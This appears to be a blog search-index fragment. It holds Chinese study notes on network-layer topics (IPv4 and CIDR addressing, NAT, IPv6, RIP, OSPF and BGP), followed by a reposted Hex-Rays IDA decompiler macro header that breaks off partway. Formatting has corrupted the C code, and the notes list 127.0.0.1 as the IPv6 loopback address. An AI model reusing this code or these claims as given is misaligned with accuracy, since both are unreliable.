阻塞（Head-of-the-line）：排在队列前面的数据报可能会阻碍队列中其他的数据报的转发 交换 负责将分组从输入端口的缓存发送到合适的输出端口缓存\n交换速率：从所有输入端口到所有输出端口转发分组的速率\n纵横式交换机：每一个交叉点都使用微交换机\n榕树交换机：多级交换机，每一级都有一个微开关\n输出 产生的问题：\n若发出分组的速度比交换结构的速度慢，则分组会在输出端口的缓存中排队。 若缓存大小不足，则分组可能因为发生拥塞而丢失 需要使用调度算法来选择传输哪些排队的分组\n调度策略 基于优先级 高优先级的排队分组最先发送\n分类的标准可能是特殊标记、或其他首部信息。例如 IP 源地址、IP 目的地址、端口号等\n其他还有轮询调度策略等\nIP 协议 (网际协议) 与 IP 协议配套使用的还有三个协议：\n地址解析协议 ARP (Address Resolution Protocol) 网际控制报文协议 ICMP (Internet Control Message Protocol) 网际组管理协议 IGMP (Internet Group Management Protocol) 利用 IP 协议就可以使这些性能各异的网络在网络层上看起来好像是一个统一的网络。这种使用 IP 协议的虚拟互连网络可简称为 IP 网（IP 网是虚拟的，但平常不必每次都强调“虚拟”二字）。\nIP 地址 IP 地址就是给每个连接在互联网上的主机（或路由器）分配一个在全世界范围是唯一的 32 位的标识符（一般用形如 X.X.X.X 的方式表示，每个 X 对应 8 位的二进制数）\nIP地址和MAC地址 硬件地址（或物理地址）是数据链路层和物理层使用的地址。 IP 地址是网络层和以上各层使用的地址，是一种逻辑地址（称 IP 地址是逻辑地址是因为 IP 地址是用软件实现的）。 IP 层抽象的互联网却屏蔽了下层这些很复杂的细节。只要我们在网络层上讨论问题，就能够使用统一的、抽象的 IP 地址研究主机和主机或路由器之间的通信\n在链路层是看不到IP地址的，只能看到帧，然后把取出来的IP数据报抛给网络层去分析，让网络层不必关心链路上传播的细节。\n为什么不直接用硬件地址进行通信？ （过去）难以统一标准：全世界存在着各式各样的网络，它们使用不同的硬件地址 方便快捷：连接到互联网的主机只需各自拥有一个唯一的 IP 地址，它们之间的通信就像连接在同一个网络上那样简单方便 编址方法 分类的 IP 地址 -\u0026gt; 子网的划分（subnetting）-\u0026gt; 构成超网（CIDR）（现在使用）\n分类 IP 地址 IP 地址划分为若干个固定类，每一类地址都由两个固定长度的字段组成：\n网络号 net-id：它标志主机（或路由器）所连接到的网络 主机号 host-id：它标志该主机（或路由器） 网络号在整个互联网内是唯一的，主机号在当前网络下又是唯一的，因此 IP 地址就唯一了\n由于近年来已经广泛使用无分类 IP 地址进行路由选择，A 类、B 类和 C 类地址的区分已成为历史\n点分十进制记法 IP 地址有 32 位，我们把每八位分为一个组，每一个组转化为十进制数，每个数之间用点号隔开，就成了 IP 地址\n常见的三类 IP 地址（A、B、C） A的第一位已经固定为0，B的一二位为10，C的前三位为110\n由上图可知，当IP地址的第一位在1 ~ 126之间为A类地址，128 ~ 191之间为B类，192 ~ 223为C类地址\n其中127开头的为特殊地址\n还有一些特殊的IP地址：\n分类IP地址的特点 IP 地址是一种分等级的地址结构 IP 地址管理机构在分配 IP 地址时只分配网络号，而剩下的主机号则由得到该网络号的单位自行分配（分封制）——方便管理 路由器仅根据目的主机所连接的网络号来转发分组 ——减少占用空间 实际上 IP 地址是标志一个主机（或路由器）和一条链路的接口 当一个主机同时连接到两个网络上时，该主机就必须同时具有两个相应的 IP 地址，其网络号 net-id 必须是不同的。这种主机称为多归属主机 (multihomed host)。 由于一个路由器至少应当连接到两个网络（这样它才能将 IP 数据报从一个网络转发到另一个网络），因此一个路由器至少应当有两个不同的 IP 地址 用转发器或网桥连接起来的若干个局域网仍为一个网络，因此这些局域网都具有同样的网络号 net-id 所有分配到网络号 net-id 的网络，无论是范围很小的局域网，还是可能覆盖很大地理范围的广域网，都是平等的 分类IP的缺点 IP 地址空间的利用率有时很低（粒度太粗） 给每一个物理网络分配一个网络号会使路由表变得太大因而使网络性能变差 两级的 IP 地址不够灵活 划分子网 将原本的两级IP地址的分级制度扩展为三级的IP地址\n原本：网络号+主机号 -\u0026gt; 划分子网：网络号+子网号+主机号\n基本思路：\n划分私有化：划分子网纯属一个单位内部的事情。单位对外仍然表现为没有划分子网的网络。 原本位数不变：从主机号借用若干个位作为子网号 subnet-id，而主机号 host-id 也就相应减少了若干个位 发送方法不变：凡是从其他网络发送给本单位某个主机的 IP 数据报，仍然是根据 IP 数据报的目的网络号 net-id，先找到连接在本单位网络上的路由器。然后此路由器在收到 IP 数据报后，再按目的网络号 net-id 和子网号 subnet-id 找到目的子网。最后就将 IP 数据报直接交付目的主机。 虽然根据已成为互联网标准协议的 RFC 950 文档，子网号不能为全 1 或全 0，但随着无分类域间路由选择 CIDR 的广泛使用，现在全 1 和全 0 的子网号也可以使用了，但一定要谨慎使用，确认你的路由器所用的路由选择软件是否支持全 0 或全 1 的子网号这种较新的用法\n划分子网的优缺点 优点：\n减少了 IP 地址的浪费 使网络的组织更加灵活 更便于维护和管理 缺点： 减少了能够连接在网络上的主机总数\n子网掩码——找出IP地址中的子网号 单单凭借IP地址是无法判断该地址是否进行了子网划分的，因此需要一个掩码（mask）来把无用的信息“档掉”，留下有用的子网号\n把IP地址与掩码进行逐位的与运算，就可以把主机号屏蔽，留下网络号+子网号\nA、B、C类IP地址的默认子网掩码：\n因此，各地方就可以使用不同的子网掩码，从而将子网号从主机号中区分出来\n因此，对于路由器：\n和相邻路由器交换路由信息时，必须把自己所在网络（或子网）的子网掩码告诉相邻路由器 路由表中的每一个项目，除了要给出目的网络地址外，还必须同时给出该网络的子网掩码 若一个路由器连接在两个子网上，就拥有两个网络地址和两个子网掩码 固定长度子网和变长子网 有固定长度子网和变长子网两种子网划分方法。\n在采用固定长度子网时，所划分的所有子网的子网掩码都是相同的\n超网（无分类编址）CIDR – Classless Inter-Domain Routing B 类地址在 1992 年已分配了近一半，眼看就要在 1994 年 3 月全部分配完毕！ 互联网主干网上的路由表中的项目数急剧增长（从几千个增长到几万个）。 整个 IPv4 的地址空间最终将全部耗尽 产生的主要原因就是IP不够了\nCIDR消除了A/B/C类的划分，因此可以更加有效地分配IPv4的地址空间：\n网络号和子网号 -\u0026gt; 各种长度的“网络前缀”(network-prefix) 三级地址 -\u0026gt; 两级地址 CIDR 使用 “斜线记法”(slash notation)，又称为 CIDR 记法：\n在 IP 地址面加上一个斜线“/”，然后写上网络前缀所占的位数 -\u0026gt; 代替了子网掩码的作用\n/20的意思是前面有20个1的掩码，因此虽然CIDR不使用子网掩码了，但仍然使用掩码这一概念\n例如： 220.78.168.0/24\nCIDR地址块 CIDR 把网络前缀都相同的连续的 IP 地址组成“CIDR 地址块”\n如，128.14.32.0/20 表示的地址块共有 $2^{12}$ 个地址，简称为“/20 地址块”，最小地址：128.14.32.0，最大地址：128.14.47.255\nps.全 0 和全 1 的主机号地址一般不使用\n路由聚合 (route aggregation)/构成超网 (supernetting) 一个 CIDR 地址块可以表示很多地址，这种地址的聚合常称为路由聚合\n由于相同的IP地址由于网络前缀的不同可以表达不同的意思，而网络前缀的位数又极为自由，所以极大地扩展了IP地址的数量\n优点：\n因为网络前缀的位数是随意定的，所以路由表中的一个项目可以表示很多个（例如上千个）原来传统分类地址的路由 有利于减少路由器之间的路由选择信息的交换，从而提高了整个互联网的性能 CIDR的简写 10.0.0.0/10 可简写为 10/10，也就是把点分十进制中低位连续的 0 省略 网络前缀的后面加一个星号 * 的表示方法，如 00001010 00*，在星号 * 之前是网络前缀，而星号 * 表示 IP 地址中的主机号，可以是任意值 CIDR的特点 前缀长度不超过 23 位的 CIDR 地址块都包含了多个 C 类地址，这些 C 类地址合起来就构成了超网。 CIDR 地址块中的地址数一定是 2 的整数次幂。 网络前缀越短，其地址块所包含的地址数就越多。而在三级结构的IP地址中，划分子网是使网络前缀变长。 地址聚合 这样子路由器就只需要记住206.0.68.0/22就🆗了，剩下大学各个系的IP地址怎么样由大学自己确定，这样路由器的负担就减少了。\n这里其实是用了一种非常优雅的方式表达划分子网的概念\nIP数据报 首部 （每一行是4字节，固定部分一共五行，一共20字节）\n版本号：ipv4、ipv6等版本号 首部长度：最短为0101，单位为四个字节。也就是说首部的长度最低为5*4个字节；这同时也说明了首部的长度最低为1111也就是15*4个字节 区分服务：用于区分向不同数据报提供的服务，一般来说没有用 总长度：一共16位，总长度=首部+数据，单位为字节。所以总长度最大可以到$2^{16} – 1 = 65535$ 字节。但这只是理论长度，由于以太网链路层帧长度的限制，IP数据报的总长度不得超过最大传送单元MTU也就是1500个字节 标识 identification：占16位，IP软件一直在记录产生了多少个IP数据报。当IP数据报因为过长而不得不拆分时，软件就将计数赋予这个数据报的所有分组的标识位 标志/旗标 flag：一共三位，但目前只有两位有意义 最低位为MF MF=1-\u0026gt;后面还有分片 MF=0-\u0026gt;这是最后一个分片 中间位为DF DF=1-\u0026gt;不能分片 DF=0-\u0026gt;允许分片 片偏移：占13位，表示改分片在原本的数据报中的偏移量，也就是其相对位置。单位为8个字节，也就是说每一个分片长度必然为8个字节的整数倍 分片主要是为了满足链路层的限制 但是分片造成数据量和任务量的增加 生存空间 TTL：一共八位 一开始表示数据报在网络中的寿命，当数据报经过一个路由器，就减去在这个路由器消耗的时间（如果时间小于1s就当作1s），防止无效的数据报在网络中兜圈子 后来技术进步，数据报在路由器花费的时间往往远小于1s，TTL意义变为跳数限制的意思，每经过一个路由器就减1 协议：8位，表示网络层应该上交给什么协议 首部检验和：16位，只检验数据报的首部，但不包括数据部分，以节省时间 不采用CRC，采用另一种简单计算方法： 发送方： 把首部分成很多个16位的序列 把检验和的那16位置零 把所有序列按反码相加，结果写入检验和字段 再对结果取反 接收方： 把首部分成很多个16位的序列 把所有序列按反码相加 如果首部无误，则结果必为0 源地址：32位 目的地址：32位 可变部分 IP 首部的可变部分就是一个选项字段，用来支持排错、测量以及安全等措施\n增加首部的可变部分是为了增加 IP 数据报的功能，但这同时也使得 IP 数据报的首部长度成为可变的，增加了每一个路由器处理数据报的开销\n因此，可变部分很少被使用，IPv6甚至直接将数据报设为固定长的\nNAT-Network Address Translation 网络地址转换 使用NAT的原因：\nIP地址紧缺 减少路由表的条目数，减轻路由器的负担 透明性： 更改IP不需要广而告之 可以更改ISP而不需要更改本地设备的IP地址 安全性：本地设备不能直接被外界访问 本地地址和全球地址 本地地址：仅在机构内部使用的 IP 地址，可以由本机构自行分配 全球地址：全球唯一的 IP 地址，必须向互联网的管理机构申请 但是如果本地地址和全球地址中某个地址重合，就会出现二义性问题\n专用于本地地址的地址块 这种网络又称为专用互联网、本地互联网、专用网 这种网络的地址又称为可重用地址 那本地网络内的主机如何与互联网上的其他主机进行通信（在不需要加密的情况下）呢？\n答案就是NAT转换\nNAT转换的具体内容 NAT实际上是本地网络和全球网络中间的媒介\n需要在专用网连接到互联网的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT路由器，它至少有一个有效的外部全球IP地址。 所有使用本地地址的主机在和外界通信时，都要在 NAT 路由器上将其本地地址转换成全球 IP 地址，才能和互联网连接。 因此，全球地址相当于一个房子的门，而房子里的各房间的门就是本地地址\nNAT：纯粹的地址转换，现实不使用 NAPT：加上端口一起转换\n如果没有NAT，主机A可以向主机B发送数据报，但是主机B发不回来，因为目的地址是本地地址\n纯NAT的计算方法 直接将数据报中的源IP地址（主机A的本地地址）替换为NAT中的全球地址，把转换结果记录到NAT地址转换表中\n当接收时，就根据NAT地址转换表将数据报转发给主机A\n纯NAT的局限 如果具有的全球IP地址数量小于主机数，本地地址要轮流使用全球地址 无法充当服务器使用：NAT地址转换表不确定，主机A又没有全球地址，主机B无法确定地访问主机A，导致单向性 NAPT的计算方法 只需要一个全球IP地址，不同主机的IP通过NAT路由器的端口号来区分\n本地地址+端口号 -\u0026gt; 全球地址+新端口号\n因此，NAPT是用端口号来区分不同的主机，而端口号又占用16位，可以支持六万多台本地主机\nNAPT的缺点 NAT是“有争议性”的、“临时”的解决手段\n路由器应至多只处理第三层；端口号是第四层的 地址短缺应由IPv6彻底解决，而不应该让NAT作临时解决 违背了端对端原则（end-to-end argument），应该让端系统负责智能而不是网络负责智能 NAT后的主机不能同时作为服务器向外提供服务 IPv6 IPv6 仍支持无连接的传送，但将协议数据单元 PDU 称为分组 到目前为止，IPv6 还只是草案标准阶段\nIPv6的特点 更大的地址空间。IPv6 将地址从 IPv4 的 32 位 增大到了 128 位。 扩展的地址层次结构。 灵活的首部格式。 IPv6 定义了许多可选的扩展首部。 改进的选项。 IPv6 允许数据报包含有选项的控制信息，其选项放在有效载荷中。 IPv6的首部 IPv6 首部改为 8 字节对齐，原来是4字节对齐，但首部长度是固定的\nIPv6数据报由基本首部和有效载荷两部分组成，有效载荷中允许有零个或多个扩展首部 (extension header)，再后面是数据部分\n与IPv4首部的差别是：\n❌首部长度（长度固定） ❌服务类型 总长度 -\u0026gt; 有效载荷长度 ❌标识、标志和片偏移 TTL -\u0026gt; 跳数限制字段 协议字段 -\u0026gt; 下一个首部字段 ❌检验和字段 ❌选项字段（使用扩展首部） 从而IPv6 首部的字段数减少到只有 8 个\nIPv6 把原来 IPv4 首部中选项的功能都放在扩展首部中，并将扩展首部留给路径两端的源站和目的站的主机来处理（把智能的事情交给端系统），经过的路由器都不处理这些扩展首部\nIPv6的地址 目的地址可以是：\n单播 多播 任播（新增，任播的终点是一组计算机，但数据报只交付其中的一个，通常是距离最近的一个） IPv6 将实现 IPv6 的主机和路由器均称为结点，一个结点就可能有多个与链路相连的接口，IPv6 地址是分配给结点上面的接口的。\n一个接口可以有多个单播地址。 其中的任何一个地址都可以当作到达该结点的目的地址。即一个结点接口的单播地址可用来唯一地标志该结点。 冒号十六进制记法 每个 16 位的值用十六进制值表示，各值之间用冒号分隔。例如：68E6:8C64:FFFF:FFFF:0:1180:960A:FFFF\n简写 在十六进制记法中，允许把数字前面的 0 省略。例如把 0000 中的前三个 0 省略，写成 1 个 0 每个地址允许且仅允许一次零压缩，即一连串连续的零可以为一对冒号所取代，如：FF05:0:0:0:0:0:0:B3 -\u0026gt; FF05::B3 特殊记法 冒号十六进制记法可结合使用点分十进制记法的后缀： 128.10.2.1 -\u0026gt; 0:0:0:0:0:0:128.10.2.1 -\u0026gt; ::128.10.2.1\nCIDR 的斜线表示法仍然可用： 60 位的前缀 12AB00000000CD3 可记为：12AB:0000:0000:CD30:0000:0000:0000:0000/60 -\u0026gt; 12AB::CD30:0:0:0:0/60 或 12AB:0:0:CD30::/60\n分类 未指明地址：这个地址只能为还没有配置到一个标准的 IP 地址的主机当作源地址使用 环回地址：127.0.0.1 多播地址：和IPv4一样 有些单位的网络使用 TCP/IP 协议，但并没有连接到互联网上。连接在这样的网络上的主机都可以使用这种本地地址进行通信，但不能和互联网上的其他主机通信。 全球单播地址：就是普通的全球通信IP 向IPv6过渡 有两种向 IPv6 过渡的策略，即使用双协议栈和使用隧道技术\n双协议栈 双协议栈主机在和 IPv6 主机通信时采用 IPv6 地址，而和 IPv4 主机通信时则采用 IPv4地址（使用域名系统DNS查询）\n当IPv6数据报转化为v4后再转回来时，有一部分首部无法恢复，只能空缺，这种信息的损失是使用首部转换方法所不可避免的\n隧道技术 在 IPv6 数据报要进入 IPv4 网络时，把 IPv6 数据报封装成为 IPv4数据报，现在整个的 IPv6 数据报变成了 IPv4 数据报的数据部分\n要使双协议栈的主机知道 IPv4 数据报里面封装的数据是一个 IPv6 数据报，就必须把IPv4 首部的协议字段的值设置为 41\n路由协议/算法 路由协议的目的：决定从起点（source address, sending host）到终点（destination address, receiving host）的，经过若干个路由器的，最佳路径\n理想的路由算法 正确的和完整的 简单 应能适应通信量和网络拓扑的变化（自适应性） 稳定性 公平 最佳 分层次的路由选择协议 使用原因 互联网的规模非常大 许多单位不愿意外界了解自己单位网络的布局细节和本部门所采用的路由选择协议（这属于本部门内部的事情），但同时还希望连接到互联网上 因此， 可以把整个互联网划分为许多较小的自治系统(autonomous system, AS)\n在目前的互联网中，一个大的 ISP 就是一个自治系统\n自治系统 AS 是在单一技术管理下的一组路由器，而这些路由器使用一种自治系统内部的路由选择协议和共同的度量 一个 AS 对其他 AS 表现出的是一个单一的和一致的路由选择策略 两类路由选择协议 内部网关协议 IGP (Interior Gateway Protocol)，如 RIP 和 OSPF 协议 外部网关协议 EGP (External Gateway Protocol)，目前使用最多的外部网关协议是 BGP 的版本 4（BGP-4） 因为历史原因，网关也可用于表示路由器\n自治系统之间的路由选择也叫做域间路由选择(interdomain routing)，而在自治系统内部的路由选择叫做域内路由选择(intradomain routing)\n【内部网关协议】路由信息协议 RIP协议 最先得到广泛使用的 分布式的、基于距离向量的 要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录 距离可以理解为跳数，取得是最短跳数 从一个路由器到直接连接的网络的距离定义为 1。 从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加 1 RIP 允许一条路径最多只能包含 15 个路由器，也就是距离要小于等于15，“距离”的最大值为 16 时即相当于不可达 不能在两个网络之间同时使用多条路由 RIP 选择一个具有最少路由器的路由，哪怕另一条路由器多的路由更快 RIP的特点 仅和相邻路由器交换信息。 交换的信息是当前本路由器所知道的全部信息，即自己的路由表。 按固定的时间间隔交换路由信息，例如，每隔 30 秒。当网络拓扑发生变化时，路由器也及时向相邻路由器通告拓扑变化后的路由信息。 路由表的建立 路由器在刚刚开始工作时，只知道到直接连接的网络的距离（此距离定义为 1）。它的路由表是空的。 以后，每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。 经过若干次更新后，所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。 RIP 协议的收敛 (convergence) 过程较快。“收敛”就是在自治系统中所有的结点都得到正确的路由选择信息的过程。\nRIP2协议报文格式 RIP协议的优缺点 优点：\n实现简单，开销较小。 缺点：\nRIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。 路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。 “坏消息传播得慢”，使更新过程的收敛时间过长。 【内部网关协议】开放最短路径优先 OSPF (Open Shortest Path First)协议 “开放”表明 OSPF 协议不是受某一家厂商控制，而是公开发表的。 “最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法 SPF采用分布式的链路状态协议 (link state protocol) 三个要点 向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法。 发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。 “链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量”(metric)。 只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。 链路状态数据库 (link-state database) 是全网的拓扑结构图，它在全网范围内是一致的（这称为链路状态数据库的同步） 能较快地进行更新，使各个路由器能及时更新其路由表，因此更新过程收敛得快 OSPF的区域 OSPF 将一个自治系统再划分为若干个更小的范围，叫做区域。\n每一个区域都有一个用点分十进制表示的 32 位的区域标识符 在一个区域内的路由器最好不超过 200 个 区域分为两种，主干区域0.0.0.0和其他下层区域 划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量 因此，在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑的情况\nOSPF的特点 OSPF 不用 UDP 而是直接用 IP 数据报传送。 OSPF 构成的数据报很短。这样做可减少路由信息的通信量 OSPF 对不同的链路可根据 IP 分组的不同服务类型 TOS 而设置成不同的代价。因此，OSPF 对于不同类型的业务可计算出不同的路由 如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。这叫做多路径间的负载平衡。 所有在 OSPF 路由器之间交换的分组都具有鉴别的功能。 支持可变长度的子网划分和无分类编址 CIDR 每一个链路状态都带上一个 32 位的序号，序号越大状态就越新 OSPF 还规定每隔一段时间，如 30 分钟，要刷新一次数据库中的链路状态。 由于一个路由器的链路状态只涉及到与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因此当互联网规模很大时，OSPF 协议要比距离向量协议 RIP 好得多。 OSPF 没有“坏消息传播得慢”的问题，据统计，其响应网络变化的时间小于 100 ms OSPF分组格式 五种类型：\n类型1，问候 (Hello) 分组。 类型2，数据库描述 (Database Description) 分组。 类型3，链路状态请求 (Link State Request) 分组。 类型4，链路状态更新 (Link State Update) 分组，洪泛法对全网更新链路状态。 类型5，链路状态确认 (Link State Acknowledgment)分组。 指定的路由器 多点接入的局域网采用了指定的路由器 (designated router) 的方法，使广播的信息量大大减少。 指定的路由器代表该局域网上所有的链路向连接到该网络上的各路由器发送状态信息 与RIP的对比 【外部网关协议】BGP协议 BGP 是不同自治系统的路由器之间交换路由信息的协议\n边界网关协议 BGP 力求寻找一条能够到达目的网络且比较好的路由（不能兜圈子），而并非要寻找一条最佳路由\nBGP发言人 每一个自治系统的管理员要选择至少一个路由器作为该自治系统的 “ BGP 发言人” (BGP speaker)\n一般说来，两个 BGP 发言人都是通过一个共享网络连接在一起的，而 BGP 发言人往往就是 BGP 边界路由器，但也可以不是 BGP 边界路由器\nBGP交换路由信息 一个 BGP 发言人与其他自治系统中的 BGP 发言人要交换路由信息，就要先建立 TCP 连接，然后在此连接上交换 BGP 报文以建立 BGP 会话(session)，利用 BGP 会话交换路由信息。\n使用 TCP 连接能提供可靠的服务，也简化了路由选择协议。 使用 TCP 连接交换路由信息的两个 BGP 发言人，彼此成为对方的邻站(neighbor)或对等站(peer) 。 BGP发言人交换路径向量 BGP协议的特点 BGP协议的四种报文 BGP协议报文格式 两类基本路由算法 网络的图的抽象 链路成本 要找到从起点到终点的最小成本的路径，这就是路由算法需要解决的问题\n路由算法的分类 根据路由算法是需要中心化的、全局的信息，还是去中心化的、局部的信息，可以分为两类：\n链路状态算法（知道全局信息） 距离向量算法（只知道局部信息） 链路状态算法 距离向量算法 当链路成本发生变化时：\n“好消息传得快”：链路成本变小 “坏消息传得慢”：链路成本变大、链路断了等等，可能会造成路由环路 为了避免路由环路，可以使用毒性逆转： 如果z -\u0026gt; y -\u0026gt; x，则z向y通告$𝐷_𝑧(𝑥)=∞$（即使z知道$𝐷_𝑧 (𝑥)$是某个数值）。这样可以防止y重新经过z到达x。\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/","section":"principle","summary":"It isn\u0026rsquo;t where you come from, it\u0026rsquo;s where you\u0026rsquo;re going that counts. — Ella Fitzgerald 链路层干的事情是局部的，网络层干的事情是全局的 网络层 概述 网络层提供的服务 路由和转发 网络层提供的两种分组交换的方法 数据报方","tags":["计算机网络"],"title":"网络层"},{"categories":["principle"],"contents":" All serious daring starts from within. — Harriet Beecher Stowe\n本文转载自IDA逆向常用宏定义_丑大狗的博客-CSDN博客\n/* This file [contains](https://so.csdn.net/so/search?q=contains\u0026amp;spm=1001.2101.3001.7020) definitions used by the Hex-Rays decompiler output. It has type definitions and convenience macros to make the output more readable. Copyright © 2007-2011 Hex-Rays */ #if defined(**GNUC**) typedef long long ll; typedef unsigned long long ull; #define __int64 long long #define __int32 int #define __int16 short #define __int8 char #define MAKELL(num) num ## LL #define FMT_64 “ll” #elif defined(_MSC_VER) typedef __int64 ll; typedef unsigned __int64 ull; #define MAKELL(num) num ## i64 #define FMT_64 “I64” #elif defined (**BORLANDC**) typedef __int64 ll; typedef unsigned __int64 ull; #define MAKELL(num) num ## i64 #define FMT_64 “L” #else #error “unknown compiler” #endif typedef unsigned int uint; typedef unsigned char uchar; typedef unsigned short ushort; typedef unsigned long ulong; typedef char int8; typedef signed char sint8; typedef unsigned char uint8; typedef short int16; typedef signed short sint16; typedef unsigned short uint16; typedef int int32; typedef signed int sint32; typedef unsigned int uint32; typedef ll int64; typedef ll sint64; typedef ull uint64; // Partially defined types: #define _BYTE uint8 #define _WORD uint16 #define _DWORD uint32 #define _QWORD uint64 #if !defined(_MSC_VER) #define _LONGLONG __int128 #endif #ifndef _WINDOWS_ typedef int8 BYTE; typedef int16 WORD; typedef int32 DWORD; typedef int32 LONG; #endif typedef int64 QWORD; #ifndef __cplusplus typedef int bool; // we want to use bool in our C programs #endif // Some convenience macros to make partial accesses nicer // first unsigned macros: #define LOBYTE(x) (_((_BYTE_)\u0026amp;(x))) // low byte #define LOWORD(x) (_((_WORD_)\u0026amp;(x))) // low word #define LODWORD(x) (_((_DWORD_)\u0026amp;(x))) // low dword #define HIBYTE(x) (_((_BYTE_)\u0026amp;(x)+1)) #define HIWORD(x) (_((_WORD_)\u0026amp;(x)+1)) #define HIDWORD(x) (_((_DWORD_)\u0026amp;(x)+1)) #define BYTEn(x, n) (_((_BYTE_)\u0026amp;(x)+n)) #define WORDn(x, n) (_((_WORD_)\u0026amp;(x)+n)) #define BYTE1(x) BYTEn(x, 1) // byte 1 (counting from 0) #define BYTE2(x) BYTEn(x, 2) #define BYTE3(x) BYTEn(x, 3) #define BYTE4(x) BYTEn(x, 4) #define BYTE5(x) BYTEn(x, 5) #define BYTE6(x) BYTEn(x, 6) #define BYTE7(x) BYTEn(x, 7) #define BYTE8(x) BYTEn(x, 8) #define BYTE9(x) BYTEn(x, 9) #define BYTE10(x) BYTEn(x, 10) #define BYTE11(x) BYTEn(x, 11) #define BYTE12(x) BYTEn(x, 12) #define BYTE13(x) BYTEn(x, 13) #define BYTE14(x) BYTEn(x, 14) #define BYTE15(x) BYTEn(x, 15) #define WORD1(x) WORDn(x, 1) #define WORD2(x) WORDn(x, 2) // third word of the object, unsigned #define WORD3(x) WORDn(x, 3) #define WORD4(x) WORDn(x, 4) #define WORD5(x) WORDn(x, 5) #define WORD6(x) WORDn(x, 6) #define WORD7(x) WORDn(x, 7) // now signed macros (the same but with sign extension) #define SLOBYTE(x) (_((int8_)\u0026amp;(x))) #define SLOWORD(x) (_((int16_)\u0026amp;(x))) #define SLODWORD(x) (_((int32_)\u0026amp;(x))) #define SHIBYTE(x) (_((int8_)\u0026amp;(x)+1)) #define SHIWORD(x) (_((int16_)\u0026amp;(x)+1)) #define SHIDWORD(x) (_((int32_)\u0026amp;(x)+1)) #define SBYTEn(x, n) (_((int8_)\u0026amp;(x)+n)) #define SWORDn(x, n) (_((int16_)\u0026amp;(x)+n)) #define SBYTE1(x) SBYTEn(x, 1) #define SBYTE2(x) SBYTEn(x, 2) #define SBYTE3(x) SBYTEn(x, 3) #define SBYTE4(x) SBYTEn(x, 4) #define SBYTE5(x) SBYTEn(x, 5) #define SBYTE6(x) SBYTEn(x, 6) #define SBYTE7(x) SBYTEn(x, 7) #define SBYTE8(x) SBYTEn(x, 8) #define SBYTE9(x) SBYTEn(x, 9) #define SBYTE10(x) SBYTEn(x, 10) #define SBYTE11(x) SBYTEn(x, 11) #define SBYTE12(x) SBYTEn(x, 12) #define SBYTE13(x) SBYTEn(x, 13) #define SBYTE14(x) SBYTEn(x, 14) #define SBYTE15(x) SBYTEn(x, 15) #define SWORD1(x) SWORDn(x, 1) #define SWORD2(x) SWORDn(x, 2) #define SWORD3(x) SWORDn(x, 3) #define SWORD4(x) SWORDn(x, 4) #define SWORD5(x) SWORDn(x, 5) #define SWORD6(x) SWORDn(x, 6) #define SWORD7(x) SWORDn(x, 7) // Helper functions to represent some assembly instructions. #ifdef __cplusplus // Fill memory block with an integer value inline void memset32(void *ptr, uint32 value, int count) { uint32 *p = (uint32 *)ptr; for ( int i=0; i \u0026lt; count; i++ ) *p++ = value; } // Generate a reference to pair of operands template int16 **PAIR**( int8 high, T low) { return ((( int16)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint8(low); } template int32 **PAIR**( int16 high, T low) { return ((( int32)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint16(low); } template int64 **PAIR**( int32 high, T low) { return ((( int64)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint32(low); } template uint16 **PAIR**(uint8 high, T low) { return (((uint16)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint8(low); } template uint32 **PAIR**(uint16 high, T low) { return (((uint32)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint16(low); } template uint64 **PAIR**(uint32 high, T low) { return (((uint64)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint32(low); } // rotate left template T **ROL**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; T high = value \u0026gt;\u0026gt; (nbits - count); value \u0026lt;\u0026lt;= count; value |= high; return value; } // rotate right template T **ROR**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; T low = value \u0026lt;\u0026lt; (nbits - count); value \u0026gt;\u0026gt;= count; value |= low; return value; } // carry flag of left shift template int8 **MKCSHL**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; return (value \u0026gt;\u0026gt; (nbits-count)) \u0026amp; 1; } // carry flag of right shift template int8 **MKCSHR**(T value, uint count) { return (value \u0026gt;\u0026gt; (count-1)) \u0026amp; 1; } // sign flag template int8 **SETS**(T x) { if ( sizeof(T) == 1 ) return int8(x) \u0026lt; 0; if ( sizeof(T) == 2 ) return int16(x) \u0026lt; 0; if ( sizeof(T) == 4 ) return int32(x) \u0026lt; 0; return int64(x) \u0026lt; 0; } // overflow flag of subtraction (x-y) template\u0026lt;class T, class U\u0026gt; int8 **OFSUB**(T x, U y) { if ( sizeof(T) \u0026lt; sizeof(U) ) { U x2 = x; int8 sx = **SETS**(x2); return (sx ^ **SETS**(y)) \u0026amp; (sx ^ **SETS**(x2-y)); } else { T y2 = y; int8 sx = **SETS**(x); return (sx ^ **SETS**(y2)) \u0026amp; (sx ^ **SETS**(x-y2)); } } // overflow flag of addition (x+y) template\u0026lt;class T, class U\u0026gt; int8 **OFADD**(T x, U y) { if ( sizeof(T) \u0026lt; sizeof(U) ) { U x2 = x; int8 sx = **SETS**(x2); return ((1 ^ sx) ^ **SETS**(y)) \u0026amp; (sx ^ **SETS**(x2+y)); } else { T y2 = y; 